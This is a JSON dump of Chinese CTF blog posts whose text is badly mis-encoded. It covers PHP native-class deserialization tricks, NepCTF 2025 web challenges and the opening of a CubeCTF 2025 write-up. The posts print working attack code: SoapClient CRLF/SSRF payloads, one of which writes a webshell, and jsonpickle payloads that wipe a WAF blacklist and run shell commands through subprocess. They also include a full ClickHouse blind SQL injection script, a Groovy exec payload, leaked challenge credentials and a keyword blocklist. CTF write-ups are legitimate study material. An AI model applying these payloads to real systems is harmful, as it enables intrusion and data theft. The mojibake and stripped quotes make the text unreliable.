é…åˆä½¿ç”¨SoapClientååºåˆ—åŒ–+CRLF å¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚ EX1ï¼š ?php$target = http://47.xxx.xxx.72:2333/;$post_data = data=whoami;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93);$a = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: . (string)strlen($post_data).^^^^.$post_data,uri=test));$b = serialize($a);$b = str_replace(^^, \\r,$b);echo $b;$c = unserialize($b);$c-a(); // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf? EX2ï¼š ?php$target = http://127.0.0.1/flag.php;// å¡«å…¥postçš„æ•°æ® $post_string = a=file_put_contents(shell.php, ?php phpinfo();?);;// å¡«å…¥ä½ æƒ³è¦çš„httpå¤´$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: aaaa=ssss);$user_agent = aaa^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string;$options = array( location = $target, user_agent= $user_agent, uri= aaab);$b = new SoapClient(null, $options);$aaa = serialize($b);$aaa = str_replace(^^, %0d%0a, $aaa);$aaa = str_replace(, %26, $aaa);echo $aaa;? XXESimpleXMLElementç±» å¯ä»¥çœ‹åˆ°é€šè¿‡è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° data_is_url ä¸º trueï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹ xml æ–‡ä»¶çš„è½½å…¥ã€‚ç¬¬äºŒä¸ªå‚æ•°çš„å¸¸é‡å€¼æˆ‘ä»¬è®¾ç½®ä¸º 2 å³å¯ã€‚ç¬¬ä¸€ä¸ªå‚æ•° data å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„ payload çš„ url åœ°å€ï¼Œå³ç”¨äºå¼•å…¥çš„å¤–éƒ¨å®ä½“çš„ urlã€‚ è¿™æ ·çš„è¯ï¼Œå½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›®æ ‡è°ƒç”¨çš„ç±»çš„æ—¶å€™ï¼Œä¾¿å¯ä»¥é€šè¿‡ SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»æ¥æ„é€  XXEã€‚ [SUCTF 2018]Homework Trickè¿‡æ»¤å±æ€§åç§°ç”¨å¤§å†™çš„Såè·Ÿçš„åç§°ï¼Œphpä¼šå½“æˆ16è¿›åˆ¶è§£æ O:9:catalogue:2:s:5:class;s:13:SplFileObject;s:4:data;s:5:/flag;O:9:catalogue:2:s:5:class;S:13:SplFile\\4fbject;s:4:data;s:5:/flag;O:9:catalogue:2:s:5:class;S:13:SplFileOb\\6Aect;s:4:data;s:5:/flag;O:8:passthru:2:s:1:S;S:20:\\70\\61\\73\\73\\74\\68\\72\\75\\28\\22\\63\\61\\74\\20/\\66*\\22\\29;;s:3:dir;N; è¿‡æ»¤ç±»åå¤§å°å†™ç»•è¿‡ ç±»å†…æ–¹æ³•è°ƒç”¨é™æ€: A::test();[A,test](); åŠ¨æ€: A::test();[A,test](); éƒ¨åˆ†å‚è€ƒé“¾æ¥(æœ‰ä¸€äº›è®°ä¸åˆ°äº†) https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/https://chenxi9981.github.io/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/https://xz.aliyun.com/news/11289","tags":["Study-Note"]},{"title":"NepCTF 2025","path":"/2025/07/29/NepCTF-WEB/","content":"JavaSeriåŸºç¡€çš„shiroååºåˆ—åŒ– å·¥å…·å¯ä»¥ä¸€æŠŠæ¢­ dirsearchæ‰«å‡ºæ¥ä¸€ä¸ªwww.zip,æœ‰ä¸€å †ä¸œè¥¿ï¼Œä¹Ÿæœ‰è´¦å¯† sunxiaochuan258 NM$L@SBCNM.COM å¯†é’¥ä¸ºkPH+bIxk5D2deZiIxcaaaA è§£å†³ easyGooGooVVVY and RevengeGooGooVVVYé€šç”¨poc å‡ºé¢˜äººwafæ²¡æ¢è¯´æ˜¯ this.class.classLoader.loadClass(java.lang.Runtime) .getRuntime() .exec(env) .inputStream .text safe_bankå‰è¨€:è¿™é“é¢˜å¾ˆè€ƒéªŒpythonä»£ç å®¡è®¡çš„èƒ½åŠ› éœ€è¦æˆ‘ä»¬è‡ªå·±å»è¯»æºç  è¿˜æœ‰ä¸€äº›å°å°çš„å‘ç‚¹ è¿›å…¥é¢˜ç›®æœ‰ å’Œä¸€ä¸ªæ³¨å†Œæ¡† å…ˆæ³¨å†Œå¸å·è¿›å»çœ‹çœ‹ æç¤ºæˆ‘éœ€è¦ç®¡ç†æƒé™ authzeyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogInNhdXkiLCAidHMiOiAxNzUzNzkwNDM5fX0 è§£ç å¾— py/object: __main__.Session, meta: user: sauy, ts: 1753790439 é‚£æˆ‘ç›´æ¥useræ”¹ä¸ºadmin å“‡ï¼æ˜¯ç®¡ç†å‘˜é¢æ¿!éš¾é“æˆ‘winäº†å— è¿›å»æ˜¯å‡çš„flag(ç¬‘å˜»äº†) æ—¢ç„¶æ˜¯jsonpickle æœ‰jsonpickleååºåˆ—åŒ–è¿™ä¸ªçŸ¥è¯†ç‚¹ è¿™é‡Œæˆ‘åœ¨èµ›ä¸­ä½¿ç”¨äº†å¾ˆå¤špoc ä½†æ˜¯å› ä¸ºä¸€äº›åŸå› éƒ½æ²¡åŠæ³•æˆåŠŸæ‰“é€š(æ‚²) ä½†æ˜¯çŸ¥é“ä¸€ç‚¹waf builtins subclasses reduce system subprocess state re code os reduce import __class__ openä¸è¡Œ åå¤ç°å‚è€ƒäº†æ–‡ç« https://xz.aliyun.com/news/16133 æ³¨é‡çœ‹pyobject çœ‹åˆ° py/object: glob.glob, py/newargs: /* æ²¡æœ‰blacklisté‡Œçš„ ç›´æ¥ç”¨è¿™ä¸ªå›æ˜¾error é¢˜é‡Œé¢authzçš„ç»“æ„æ˜¯ py/object: __main__.Session, meta: user: sauy, ts: 1753790439 é‚£åº”è¯¥æ˜¯å¿…é¡»ç¬¦åˆè¿™ä¸ªç»“æ„ æŠŠé“¾å­æ”¾åœ¨userå¤„ py/object: __main__.Session, meta: user: py/object: glob.glob, py/newargs: /*, ts: 1753790439 è¿˜æ˜¯å›æ˜¾error æ­£ç¡®çš„pocæ˜¯ py/object: __main__.Session, meta: user: py/object: glob.glob, py/newargsex: [py/set:[/*],],ts:1753790439 è§£é‡Šï¼š 1.ä½¿ç”¨pynewargsex py/newargsæ˜¯ç»™å®ç°äº†__new__çš„å¯¹è±¡ç”¨çš„py/newargsexæ˜¯ç»™æ²¡å®ç°__new__çš„old-style classç”¨çš„ 2.ä½¿ç”¨setæ–¹å¼ä¼  ä¿è¯args, kwargs = obj[tags.NEWARGSEX]åœ¨è¿è¡Œæ—¶ä¸ä¼šå‡ºé”™ 3.jsonè¦å…¨éƒ¨éƒ½æ˜¯åŒå¼•å· æ‰€ä»¥è¿™é¢˜æˆ‘è®¤ä¸ºé—¨æ§›æŒºé«˜çš„,å¯¹æ²¡æœ‰è¿‡å¼€å‘ç»éªŒçš„äººæ¥è¯´ä¸å¤ªå‹å¥½ï¼Œå¾ˆæœ‰å›½å¤–xssçš„å‘³é“äº†(ä»…ä¸ªäººè§‚ç‚¹) ä½†æ˜¯æœ€åè§£å‡ºæ˜¯40å¤š å¸ˆå‚…ä»¬å¾ˆå¼º æœŸå¾…çœ‹åˆ°å…¶ä»–å¸ˆå‚…çš„è§£æ³• è¨€å½’æ­£ä¼  ä½¿ç”¨ä¸Šè¿°æ­£ç¡®pocå è¦è¯»readflag è¯»æ–‡ä»¶ py/object: linecache.getlines, py/newargs: [/flag] è¯»æºç  py/object: __main__.Session, meta: user: py/object: linecache.getlines, py/newargsex: [py/set:[/app/app.py],],ts:1753790439 æ ¼å¼åŒ–åçš„æºç  from flask import Flask, request, make_response, render_template, redirect, url_forimport jsonpickleimport base64import jsonimport osimport time# --- Flask åº”ç”¨åˆå§‹åŒ– ---app = Flask(__name__)app.secret_key = os.urandom(24) # ç”¨äºä¼šè¯å’ŒCSRFä¿æŠ¤çš„ç§˜é’¥# --- ç”¨æˆ·è´¦æˆ·å’Œä¼šè¯ç±»å®šä¹‰ ---class Account: def __init__(self, uid, pwd): self.uid = uid self.pwd = pwdclass Session: def __init__(self, meta): self.meta = meta# --- ç”¨æˆ·æ•°æ®åº“ï¼ˆç¡¬ç¼–ç ï¼‰---users_db = [ Account(admin, os.urandom(16).hex()), # ç®¡ç†å‘˜è´¦æˆ·ï¼Œå¯†ç éšæœºç”Ÿæˆ Account(guest, guest) # æ™®é€šç”¨æˆ·è´¦æˆ·]# --- ç”¨æˆ·æ³¨å†Œè¾…åŠ©å‡½æ•° ---def register_user(username, password): å°è¯•æ³¨å†Œæ–°ç”¨æˆ·ã€‚ å¦‚æœç”¨æˆ·åå·²å­˜åœ¨ï¼Œè¿”å› Falseã€‚ for acc in users_db: if acc.uid == username: return False users_db.append(Account(username, password)) return True# --- WAF é»‘åå•åˆ—è¡¨ ---# åŒ…å«å¤§é‡ç”¨äºé˜»æ­¢ååºåˆ—åŒ–æ”»å‡»çš„å…³é”®è¯FORBIDDEN = [ builtins, os, system, repr, __class__, subprocess, popen, Popen, nt, code, reduce, compile, command, pty, platform, pdb, pickle, marshal, socket, threading, multiprocessing, signal, traceback, inspect, \\\\\\\\, posix, render_template, jsonpickle, cgi, execfile, importlib, sys, shutil, state, import, ctypes, timeit, input, open, codecs, base64, jinja2, re, json, file, write, read, globals, locals, getattr, setattr, delattr, uuid, __import__, __globals__, __code__, __closure__, __func__, __self__, pydoc, __module__, __dict__, __mro__, __subclasses__, __init__, __new__]# --- Web åº”ç”¨ç¨‹åºé˜²ç«å¢™ (WAF) ---def waf(serialized): æ£€æŸ¥åºåˆ—åŒ–åçš„ JSON å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«ä»»ä½•é»‘åå•å…³é”®è¯ã€‚ try: # å…ˆè§£ææˆ Python å­—å…¸ï¼Œå†é‡æ–°å¯¼å‡ºä¸ºå­—ç¬¦ä¸²è¿›è¡Œæ£€æŸ¥ data = json.loads(serialized) payload = json.dumps(data, ensure_ascii=False) # WAFæ£€æŸ¥çš„æ˜¯è¿™ä¸ªé‡æ–°dumpçš„å­—ç¬¦ä¸² for bad in FORBIDDEN: if bad in payload: return bad # å¦‚æœå‘ç°é»‘åå•å…³é”®è¯ï¼Œè¿”å›è¯¥å…³é”®è¯ return None # æœªå‘ç°é»‘åå•å…³é”®è¯ except: return error # JSON è§£æå¤±è´¥æˆ–wafå‡½æ•°å†…éƒ¨é”™è¯¯# --- è·¯ç”±å®šä¹‰ ---@app.route(/)def root(): æ ¹é¡µé¢ï¼Œæ˜¾ç¤ºindex.html return render_template(index.html)@app.route(/register, methods=[GET, POST])def register(): ç”¨æˆ·æ³¨å†Œé¡µé¢å’Œå¤„ç† if request.method == POST: username = request.form.get(username) password = request.form.get(password) confirm_password = request.form.get(confirm_password) if not username or not password or not confirm_password: return render_template(register.html, error=æ‰€æœ‰å­—æ®µéƒ½æ˜¯å¿…å¡«çš„ã€‚) if password != confirm_password: return render_template(register.html, error=å¯†ç ä¸åŒ¹é…ã€‚) if len(username) 4 or len(password) 6: return render_template(register.html, error=ç”¨æˆ·åè‡³å°‘éœ€è¦4ä¸ªå­—ç¬¦ï¼Œå¯†ç è‡³å°‘éœ€è¦6ä¸ªå­—ç¬¦ã€‚) if register_user(username, password): return render_template(index.html, message=æ³¨å†ŒæˆåŠŸï¼è¯·ç™»å½•ã€‚) else: return render_template(register.html, error=ç”¨æˆ·åå·²å­˜åœ¨ã€‚) return render_template(register.html)@app.post(/auth)def auth(): ç”¨æˆ·è®¤è¯ï¼ˆç™»å½•ï¼‰å¤„ç† u = request.form.get(u) p = request.form.get(p) for acc in users_db: if acc.uid == u and acc.pwd == p: # è®¤è¯æˆåŠŸï¼Œç”Ÿæˆä¼šè¯ä»¤ç‰Œ sess_data = Session(user: u, ts: int(time.time())) token_raw = jsonpickle.encode(sess_data) # åºåˆ—åŒ–Sessionå¯¹è±¡ b64_token = base64.b64encode(token_raw.encode()).decode() # Base64ç¼–ç  resp = make_response(ç™»å½•æˆåŠŸã€‚) resp.set_cookie(authz, b64_token) # è®¾ç½®è®¤è¯Cookie resp.status_code = 302 resp.headers[Location] = /panel # é‡å®šå‘åˆ°é¢æ¿é¡µ return resp return render_template(index.html, error=ç™»å½•å¤±è´¥ã€‚ç”¨æˆ·åæˆ–å¯†ç æ— æ•ˆã€‚)@app.route(/panel)def panel(): ç”¨æˆ·é¢æ¿é¡µé¢ token = request.cookies.get(authz) if not token: return redirect(url_for(root, error=ç¼ºå°‘Tokenã€‚)) try: # Base64è§£ç Token decoded = base64.b64decode(token.encode()).decode() except: return render_template(error.html, error=Tokenæ ¼å¼é”™è¯¯ã€‚) # WAFæ£€æŸ¥ ban = waf(decoded) if ban: return render_template(error.html, error=fè¯·ä¸è¦é»‘å®¢æ”»å‡»ï¼ban) try: # ååºåˆ—åŒ–Sessionå¯¹è±¡ # safe=True å‚æ•°æ—¨åœ¨é˜²æ­¢ä¸å®‰å…¨çš„æ„é€ å‡½æ•°è°ƒç”¨ï¼Œä½†å¹¶éä¸‡èƒ½ sess_obj = jsonpickle.decode(decoded, safe=True) meta = sess_obj.meta # æ ¹æ®ç”¨æˆ·æƒé™æ˜¾ç¤ºä¸åŒé¢æ¿ if meta.get(user) != admin: return render_template(user_panel.html, username=meta.get(user)) return render_template(admin_panel.html) except Exception as e: # æ•æ‰ååºåˆ—åŒ–æˆ–å¤„ç†è¿‡ç¨‹ä¸­çš„å¼‚å¸¸ return render_template(error.html, error=fæ•°æ®è§£ç å¤±è´¥ã€‚)@app.route(/vault)def vault(): é‡‘åº“é¡µé¢ï¼ˆåªæœ‰ç®¡ç†å‘˜èƒ½è®¿é—®å¹¶æŸ¥çœ‹Flagï¼‰ token = request.cookies.get(authz) if not token: return redirect(url_for(root)) try: decoded = base64.b64decode(token.encode()).decode() # WAFæ£€æŸ¥ if waf(decoded): return render_template(error.html, error=è¯·ä¸è¦å°è¯•é»‘å®¢æ”»å‡»ï¼) # ååºåˆ—åŒ–Sessionå¯¹è±¡ sess_obj = jsonpickle.decode(decoded, safe=True) meta = sess_obj.meta # æƒé™æ£€æŸ¥ if meta.get(user) != admin: return render_template(error.html, error=è®¿é—®è¢«æ‹’ç»ã€‚åªæœ‰ç®¡ç†å‘˜æ‰èƒ½æŸ¥çœ‹æ­¤é¡µé¢ã€‚) # ç®¡ç†å‘˜ä¸“å±ï¼Œæ˜¾ç¤ºFlag flag = NepCTFfake_flag_this_is_not_the_real_one return render_template(vault.html, flag=flag) except: # æ³›å‹å¼‚å¸¸æ•è·ï¼Œé‡å®šå‘å›æ ¹é¡µ return redirect(url_for(root))@app.route(/about)def about(): å…³äºé¡µé¢ return render_template(about.html)# --- åº”ç”¨è¿è¡Œ ---if __name__ == __main__: app.run(host=0.0.0.0, port=8000, debug=False) é»‘åå•ï¼ˆå“å“Ÿæˆ‘ã€‚ã€‚ã€‚ FORBIDDEN = [ builtins, os, system, repr, __class__, subprocess, popen, Popen, nt, code, reduce, compile, command, pty, platform, pdb, pickle, marshal, socket, threading, multiprocessing, signal, traceback, inspect, \\\\\\\\, posix, render_template, jsonpickle, cgi, execfile, importlib, sys, shutil, state, import, ctypes, timeit, input, open, codecs, base64, jinja2, re, json, file, write, read, globals, locals, getattr, setattr, delattr, uuid, __import__, __globals__, __code__, __closure__, __func__, __self__, pydoc, __module__, __dict__, __mro__, __subclasses__, __init__, __new__] æ–‡ç« ä¸Šæ‰€æœ‰å·²çŸ¥çš„pocéƒ½è¢«ç¦äº† é‚£ä¹ˆè‚¯å®šå°±è¦è‡ªå·±æƒ³åŠæ³•äº† è¿™é‡Œçœ‹çš„æ˜¯lamentxuå¸ˆå‚…çš„æ–¹æ³• ç›´æ¥æ¸…é™¤é»‘åå• (æš´åŠ›ç¾å­¦ èµ listå¯¹è±¡æœ‰ä¸ªæ–¹æ³• clear list.clear() è°ƒç”¨FORBIDDEN.clear()å‡½æ•° å°±å¯ä»¥å°†FORBIDDENåˆ—è¡¨æ¸…ç©ºäº†! POC: py/object: __main__.Session, meta: user: py/object:__main__.FORBIDDEN.clear,py/newargs: [],ts:1753790439 å†ä½¿ç”¨ py/object: __main__.Session, meta: user: py/object:subprocess.getoutput,py/newargs: [/readflag /app/1.txt],ts:1753790439 å†å»è¯»app1.txt py/object: __main__.Session,meta: user: py/object: subprocess.getoutput,py/newargs: [cat /app/1.txt], ts: 1753446254 æˆ‘éš¾é“ä¸æ˜¯sqlæ³¨å…¥å¤©æ‰å—æŒºå°ä¼—çš„clickhouseæ•°æ®åº“ é»‘åå•æ˜¯preg_match(/select.*from|\\(|or|and|union|except/is,$id) è¿™é‡Œçš„è„šæœ¬æ¥æºäºç¾¤é‡Œbaozongwiå¸ˆå‚…æä¾›çš„ ä½¿ç”¨äº† INTERSECT å­å¥ https://clickhouse.com/docs/zh/sql-reference/statements/select/intersect INTERSECT å­å¥ä»…è¿”å›æ¥è‡ªç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªæŸ¥è¯¢çš„ç»“æœè¡Œã€‚è¿™ä¸¤ä¸ªæŸ¥è¯¢å¿…é¡»åŒ¹é…åˆ—æ•°ã€é¡ºåºå’Œç±»å‹ã€‚`INTERSECT` çš„ç»“æœå¯ä»¥åŒ…å«é‡å¤è¡Œã€‚ --æ¥æºclickhouseå®˜æ–¹æ–‡æ¡£ import requestsfrom collections import dequefrom urllib.parse import urlparseimport timeimport sysfrom urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)# --- é…ç½® ---URL = https://nepctf31-syh2-6rti-hovn-hn4xv8mjt033.nepctf.com:443CHARSET = 1234567890abcdefghijklmnopqrstuvwxyzNCTF-#CHARSET = string.ascii_lowercase + string.digits + ~`!@#$%^*()+-=[]\\|,.?/_#CHARSET = string.ascii_letters + string.digits + string.punctuation# åº“#payload_template = id INTERSECT FROM system.databases AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age# è¡¨# payload_template = id INTERSECT FROM system.tables AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age WHERE inject.database=nepnep# å# payload_template = id INTERSECT FROM system.columns AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age WHERE inject.table=nepnep# flag# python test2.py NepCTFpayload_template = id INTERSECT FROM nepnep.nepnep AS inject JOIN users ON inject.`51@g_ls_h3r3` LIKE pattern SELECT users.id, users.name, users.email, users.ageHOSTNAME = urlparse(URL).hostnameHEADERS = Content-Type: application/x-www-form-urlencoded, Connection: keep-alive, Host: HOSTNAME# --- æ ¸å¿ƒæ£€æµ‹å‡½æ•° ---def check(prefix, exact_match=False): å‘é€ç›²æ³¨Payloadï¼Œæ ¹æ®å“åº”åˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸã€‚ è¿”å› True ä»£è¡¨æ¡ä»¶æˆç«‹ (æœåŠ¡å™¨è¿”å›äº†å†…å®¹)ã€‚ è¿”å› False ä»£è¡¨æ¡ä»¶ä¸æˆç«‹ (æœåŠ¡å™¨æœªè¿”å›å†…å®¹)ã€‚ # æ ¹æ®æ˜¯å¦ç²¾ç¡®åŒ¹é…ï¼Œå†³å®šLIKEè¯­å¥çš„æ¨¡å¼ like_pattern = prefix if exact_match else fprefix% # ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰è®¨è®ºå¹¶ç¡®è®¤æœ‰æ•ˆçš„ç›²æ³¨Payloadæ ¼å¼ # è¿™æ¯”ä½ æä¾›çš„HTTPè¯·æ±‚ä¸­çš„åŸå§‹payloadæ›´å¯é ï¼Œå› ä¸ºå®ƒèƒ½æ¸…æ™°åœ°è¿”å›çœŸ/å‡ä¸¤ç§çŠ¶æ€ final_payload = payload_template.format(pattern=like_pattern) data = id: final_payload try: # æ·»åŠ proxieså‚æ•°å¹¶ç¦ç”¨SSLè¯ä¹¦éªŒè¯(verify=False)ä»¥é…åˆä»£ç†å·¥å…· response = requests.post(URL, headers=HEADERS, data=data, timeout=15, verify=False) if User_5 in response.text: return True else: return False except requests.exceptions.RequestException as e: # ç½‘ç»œé”™è¯¯ç­‰å¼‚å¸¸æƒ…å†µï¼Œæ‰“å°é”™è¯¯å¹¶è¿”å›False print(f [Error] Request failed for prefix prefix: e, file=sys.stderr) return False# --- å¹¿åº¦ä¼˜å…ˆæœç´¢ (BFS) ç®—æ³• ---def bfs_discover(start_prefix=): ä½¿ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•æ¥å‘ç°æ‰€æœ‰è¡¨åã€‚ å¯ä»¥ä»ä¸€ä¸ªæŒ‡å®šçš„å‰ç¼€å¼€å§‹æœç´¢ã€‚ print(--- [ å¯åŠ¨å¹¿åº¦ä¼˜å…ˆ(BFS)æ³¨å…¥è„šæœ¬ ] ---) queue = deque() found_names = set() # 1. åˆå§‹åŒ–é˜Ÿåˆ— if start_prefix: print(f [+] ä»æŒ‡å®šå‰ç¼€ start_prefix å¼€å§‹æœç´¢...) # æ£€æŸ¥æä¾›çš„å‰ç¼€æ˜¯å¦æœ‰æ•ˆ if check(start_prefix): print(f - å‰ç¼€ start_prefix æœ‰æ•ˆï¼Œå°†å…¶æ·»åŠ åˆ°é˜Ÿåˆ—ã€‚) queue.append(start_prefix) # æ£€æŸ¥æä¾›çš„å‰ç¼€æœ¬èº«æ˜¯å¦å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¡¨å if check(start_prefix, exact_match=True): if start_prefix not in found_names: print(f [!] æŒ‡å®šçš„å‰ç¼€æœ¬èº«å°±æ˜¯ä¸€ä¸ªå®Œæ•´å: start_prefix ) found_names.add(start_prefix) else: print(f [-] æŒ‡å®šçš„å‰ç¼€ start_prefix æ— æ•ˆæˆ–æœªè¿”å›ä»»ä½•ç»“æœã€‚è„šæœ¬ç»ˆæ­¢ã€‚) return else: # å¦‚æœæœªæŒ‡å®šå‰ç¼€ï¼Œåˆ™ä»å•ä¸ªå­—ç¬¦å¼€å§‹æ¢æµ‹ print( [+] æ­£åœ¨æ¢æµ‹ç¬¬ä¸€å±‚å‰ç¼€ (æ‰€æœ‰å¯èƒ½çš„èµ·å§‹å­—ç¬¦)...) for char in CHARSET: if check(char): print(f - å‘ç°æœ‰æ•ˆèµ·å§‹å­—ç¬¦: char) queue.append(char) # æ£€æŸ¥å•å­—ç¬¦æœ¬èº«æ˜¯å¦å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¡¨å if check(char, exact_match=True): if char not in found_names: print(f [!] å‘ç°å®Œæ•´è¡¨å: char ) found_names.add(char) if not queue: print( [-] æœªå‘ç°ä»»ä½•æœ‰æ•ˆçš„èµ·å§‹å­—ç¬¦ï¼Œè¯·æ£€æŸ¥é…ç½®æˆ–ç›®æ ‡çŠ¶æ€ã€‚) return # 2. å¼€å§‹é€å±‚éå† print( [+] å¼€å§‹è¿›è¡Œå¹¿åº¦ä¼˜å…ˆéå†...) # `level` è¡¨ç¤ºå½“å‰æ­£åœ¨å¤„ç†çš„å‰ç¼€çš„é•¿åº¦ level = len(start_prefix) if start_prefix else 1 while queue: level_size = len(queue) print(f --- æ­£åœ¨å¤„ç†é•¿åº¦ä¸º level + 1 çš„å‰ç¼€ (å½“å‰é˜Ÿåˆ—ä¸­æœ‰ level_size ä¸ªå¾…æ‰©å±•å‰ç¼€) ---) if level_size == 0: break for _ in range(level_size): current_prefix = queue.popleft() # 3. æ‰©å±•å½“å‰å‰ç¼€ï¼Œç”Ÿæˆä¸‹ä¸€å±‚èŠ‚ç‚¹ for char in CHARSET: new_prefix = current_prefix + char # æ£€æŸ¥æ–°ç”Ÿæˆçš„å‰ç¼€æ˜¯å¦å­˜åœ¨ if check(new_prefix): print(f - å‘ç°æœ‰æ•ˆå‰ç¼€: new_prefix) queue.append(new_prefix) # 4. æ£€æŸ¥è¯¥æœ‰æ•ˆå‰ç¼€æ˜¯å¦åŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªå®Œæ•´çš„è¡¨å if check(new_prefix, exact_match=True): if new_prefix not in found_names: print(f [!] å‘ç°å®Œæ•´è¡¨å: new_prefix ) found_names.add(new_prefix) level += 1 time.sleep(0.5) # é€‚å½“æš‚åœï¼Œé¿å…å¯¹æœåŠ¡å™¨é€ æˆè¿‡å¤§å‹åŠ› print( --- [ BFSéå†å®Œæˆ ] ---) if found_names: print( [SUCCESS] æ‰€æœ‰å‘ç°çš„è¡¨å:) for name in sorted(list(found_names)): print(f - name) else: print( [-] æœªèƒ½å‘ç°ä»»ä½•å®Œæ•´çš„è¡¨åã€‚)# --- è„šæœ¬ä¸»å…¥å£ ---if __name__ == __main__: # ä»å‘½ä»¤è¡Œå‚æ•°è·å–å¯é€‰çš„èµ·å§‹å‰ç¼€ print(fç”¨æ³•: python sys.argv[0] [å¯é€‰çš„èµ·å§‹å‰ç¼€]) start_prefix = if len(sys.argv) 1: start_prefix = sys.argv[1] print(f [*] æ£€æµ‹åˆ°å‘½ä»¤è¡Œå‚æ•°ï¼Œå°†ä½¿ç”¨ start_prefix ä½œä¸ºèµ·å§‹å‰ç¼€è¿›è¡Œæœç´¢ã€‚) else: print( [*] æœªæä¾›èµ·å§‹å‰ç¼€ï¼Œå°†ä»å¤´å¼€å§‹æœç´¢æ‰€æœ‰è¡¨åã€‚) bfs_discover(start_prefix)","tags":["CTF-wp"]},{"title":"CubeCTF 2025","path":"/2025/07/23/cubectf2025-web/","content":"å¤ç°å¹³å°:https://gz.imxbt.cn/games/27/challenges# WorkerDBæ³¨å†Œå’Œç™»å½•åŠŸèƒ½ç‚¹apilogin å’Œ apiregister éšä¾¿æ³¨å†Œè¿›å»çœ‹çœ‹ å‘ç°roleæ˜¯adminç»“åˆé¢˜ç›®æè¿°é‚£æˆ‘ä»¬ç›®çš„å°±æ˜¯æˆä¸ºadmin å¹¶ä¸”å·²çŸ¥è¿™ä¸ªé¢˜æ˜¯sessionè¿›è¡ŒroleéªŒè¯ è¿™ä¸ªé¢˜æˆ‘å°è¯•äº†flask-unsignçˆ†ç ´æ˜¯ä¸è¡Œçš„ é‚£jwtè¿™æ¡è·¯è¡Œä¸é€š äºæ˜¯å°è¯•dirsearch æ‰«æå‡ºadminè·¯å¾„ è®¿é—®æç¤ºæˆ‘Access deniedï¼Œç™»é™†è¿›å»æœ‰change attributeåŠŸèƒ½ç‚¹ æŠ“åŒ…æŠ“åˆ°ä¸€ä¸ªæ–°è·¯ç”±apisettingsupdate æºç  from flask import Flask, redirect, render_template, request, jsonify, session, url_forfrom multiprocessing import Lockfrom functools import wrapsimport secretsimport sqlite3import jsonimport osapp = Flask(__name__)app.secret_key = secrets.token_hex(16)ALLOWED_ATTRIBUTES = role, email, display_name, theme, language, notifications, timezone, avatar, bio, website, locationdef init_db(): conn = sqlite3.connect(database.db) c = conn.cursor() c.execute( CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password TEXT NOT NULL, attributes TEXT NOT NULL ) ) c.execute(SELECT id FROM users WHERE username = ?, (admin,)) if not c.fetchone(): admin_attrs = json.dumps( role: admin, email: admin@example.com, display_name: Administrator ) admin_password = secrets.token_hex(16) c.execute(INSERT INTO users (username, password, attributes) VALUES (?, ?, ?), (admin, admin_password, admin_attrs)) print(created admin account with password:, admin_password) conn.commit() conn.close()def get_db(): conn = sqlite3.connect(database.db) conn.row_factory = sqlite3.Row return connl = Lock()def requires_auth(f): @wraps(f) def decorated(*args, **kwargs): if user_id not in session: return jsonify(error: Authentication required), 401 with l: return f(*args, **kwargs) return decorateddef has_xss(value): if not isinstance(value, str): return False return any(c in value for c in [, , , , (, ), , , =])@app.route(/api/register, methods=[POST])def api_register(): try: data = request.get_json() if not data: return jsonify(error: Invalid request), 400 username = data.get(username) password = data.get(password) if not username or not password: return jsonify(error: Invalid credentials), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT id FROM users WHERE username = ?, (username,)) if cursor.fetchone(): db.close() return jsonify(error: Username already exists), 400 attributes = json.dumps( role: user, email: , display_name: username, theme: light ) cursor.execute(INSERT INTO users (username, password, attributes) VALUES (?, ?, ?), (username, password, attributes)) db.commit() db.close() return jsonify(message: Registration successful) except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/login, methods=[POST])def api_login(): try: data = request.get_json() if not data: return jsonify(error: Invalid request), 400 username = data.get(username) password = data.get(password) if not username or not password: return jsonify(error: Invalid credentials), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT id, attributes FROM users WHERE username = ? AND password = ?, (username, password)) user = cursor.fetchone() db.close() if user: attrs = json.loads(user[attributes]) session[user_id] = user[id] session[role] = attrs.get(role) return jsonify(message: Login successful) return jsonify(error: Invalid credentials), 401 except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/settings/update, methods=[POST])@requires_authdef update_settings(): try: user_id = session[user_id] new_attrs = request.get_json() if not new_attrs: return jsonify(error: Invalid input), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) temp_attrs = 